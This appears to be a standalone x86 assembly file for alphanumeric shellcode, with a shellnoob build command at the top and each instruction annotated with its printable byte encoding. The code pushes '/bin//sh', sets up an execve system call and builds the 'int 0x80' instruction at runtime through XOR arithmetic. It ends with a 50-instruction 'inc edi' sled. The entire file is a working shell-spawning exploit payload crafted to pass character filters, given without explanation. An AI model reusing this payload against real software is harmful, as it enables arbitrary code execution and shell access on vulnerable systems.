#shellnoob --intel --from-asm pay.asm --to-bin pay.bin
.section .text
  push esi
  pop edx	#edx = 0

  push ecx
  pop eax
  xor al, 0x50
  push eax
  pop ebp	#ebp = 0x80000080

  push 0x31      	# .byte 0x6a,0x31                # .ascii "6a31"
  pop eax        	# .byte 0x58                     # .ascii "58"
  xor al,0x31    	# .byte 0x34,0x31                # .ascii "3431"
  push eax       	# .byte 0x50                     # .ascii "50"
  push 0x68732f2f	# .byte 0x68,0x2f,0x2f,0x73,0x68 # .ascii "682f2f7368"
  push 0x6e69622f	# .byte 0x68,0x2f,0x62,0x69,0x6e # .ascii "682f62696e"
  push esp       	# .byte 0x54                     # .ascii "54"
  pop ebx        	# .byte 0x5b                     # .ascii "5b"
  push eax       	# .byte 0x50                     # .ascii "50"
  push ebx       	# .byte 0x53                     # .ascii "53"
  push esp       	# .byte 0x54                     # .ascii "54"
  pop ecx        	# .byte 0x59                     # .ascii "59"
  push 0x38      	# .byte 0x6a,0x38                # .ascii "6a38"
  pop eax        	# .byte 0x58                     # .ascii "58"
  xor al,0x33    	# .byte 0x34,0x33                # .ascii "3433"
  push eax       	# .byte 0x50                     # .ascii "50"
  pop edi        	# .byte 0x5f                     # .ascii "5f"
  push 0x47474130	# .byte 0x68,0x30,0x41,0x47,0x47 # .ascii "6830414747"
  pop eax        	# .byte 0x58                     # .ascii "58"
  xor ax,0x4130  	# .byte 0x66,0x35,0x30,0x41      # .ascii "66353041"
  dec ax         	# .byte 0x66,0x48                # .ascii "6648"
  xor ax,0x3041  	# .byte 0x66,0x35,0x41,0x30      # .ascii "66354130"
  xor ax,0x4f73  	# .byte 0x66,0x35,0x73,0x4f      # .ascii "6635734f"
  push eax       	# .byte 0x50                     # .ascii "50"
  
  pop esi  	#tmp = eax(cd80)
  push edi	
  pop eax	#eax = 0xb

  push ebp	
  pop esp	#esp = 0x80000080

  push esi	#0x8000007c = cd80

#dummy (inc edi) * 50
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
  inc edi
